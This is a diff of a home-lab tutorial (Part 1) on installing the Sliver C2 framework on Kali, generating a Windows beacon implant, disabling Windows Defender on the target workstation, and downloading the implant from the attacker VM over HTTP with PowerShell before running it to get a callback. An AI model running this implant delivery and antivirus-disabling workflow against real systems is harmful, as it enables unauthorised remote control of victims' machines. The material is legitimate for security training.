@@ -1,14 +1,28 @@
 # Part 1 - Install of Sliver C2 on Kali VM, generate Beacon code, get call back from Windows target
 
-I will be using my Active Directory Lab from my repo "active-directoy" for this demo.
+## **Intro**
+In this part, I will be using VMs from my **Active Directory Lab** available in my repo ["active-directoy"](https://github.com/jjkirn/active-directory) for this demo.
 
-Here is some reference info from that lab:
+Here are some reference info from that lab:
 - DC1: IP address = 192.168.175.155
 - WS0: IP address = 192.168.175.123
 - Kali: IP address = 192.168.175.130
 - Management: IP address = 192.168.175.??? 
 
+Using our Kali VM, will git clone the sliver repo, and compile it using go.
+
+Using sliver, we will create a beacon implant (an .exe) and tranfer it to our lab target VM - WS0.
+
+We discover that Windows Defender blocks us from both downloading the implant and running it.
+
+We rely on a method from a John Hammond youtube video on how to disable all of Windows Defender to get our implant code to the target (A unrealistic scenario, but this is just a demo of sliver).
+
+After making the Windows Defender disable changes to WS0, we now download the implant code and run it.
+
+Back on Kali VM, we notice that we get a call back from the implant code showing our implant worked !
+
 ---
+## **NOTE:**
 [A Beginner's Guide to Sliver](https://notateamserver.xyz/sliver-101/) is available.
 
 The guide explains the fundamentals of the framework and gives example commands.
@@ -18,7 +32,7 @@ It is highly recommeded that you read this intro before you go any further as I 
 I will only be showing some of the basics to get you up-and-running and key feature such as "Armory".
 
 ---
-
+## **Getting Started**
 Lets start with cloning the [sliver repo](https://github.com/BishopFox/sliver.git).
 
 On Kali VM, open terminal window and do a git install of Sliver:
@@ -79,7 +93,7 @@ Lets start using Sliver by generating a beacon implant for a Windows x64 machine
 [*] Implant saved to /home/jim/Desktop/GREAT_EXAMINATION.exe
 ```
 
-We need to transfer the beacon "implant code" that was generated (GREAT_EXAMINATION.exe) to our Windows target.
+We need to transfer the beacon "implant code" that was generated (GREAT_EXAMINATION.exe) to our Windows target (ws01).
 
 The one of the easiest ways to transfer it to our Windows target is via http.
 
@@ -103,11 +117,11 @@ It fails because Windows Defender intercepts it!
 
 We need to disable all of Windows Defender including the realtime part.
 
-You can follow this [video - PERMANENTLY TURN OFF Windows Defender on Windows 11](https://www.youtube.com/watch?v=81l__vvGnjA) to turn off all of "Windows Defender".
+You can follow the steps in a video from John Hammond - [PERMANENTLY TURN OFF Windows Defender on Windows 11](https://www.youtube.com/watch?v=81l__vvGnjA) to turn off all of "Windows Defender".
 
-Complete all the steps from the video and reboot the the Windows Target [ws01].
+Complete all the steps from the video and reboot the Windows Workstation target [ws01].
 
-You now should be able to download and run the implant from Kali:
+You now should be able to download and run the implant on WS01:
 ```
 PS C:> Invoke-WebRequest -Uri “http://192.168.175.130:8000/GREAT_EXAMINATION.exe” -OutFile "C:\Users\alice\Downloads\GREAT_EXAMINATION.exe"
 ```
@@ -118,7 +132,7 @@ PS C:> \GREAT_EXAMINATION.exe
 ```
 
 ---
-Back on Kali, in the "sliver-server" terminal window, you should see the callback:
+Back on Kali VM, in the "sliver-server" terminal window, you should see the callback:
 ```
 [server] sliver > http
 
@@ -132,7 +146,7 @@ Back on Kali, in the "sliver-server" terminal window, you should see the callbac
  a4ace178   GREAT_EXAMINATION   http(s)     DESKTOP-WS01   XYZ\alice   windows/amd64      13s             53s           
 ```
 
-Great, ready to use the beacon in Part 2.
+Great, this was one way to get sliver working, in part 2 I will show another way and an alternate way to bypass AV.
 
 ---
 End of Part 1.
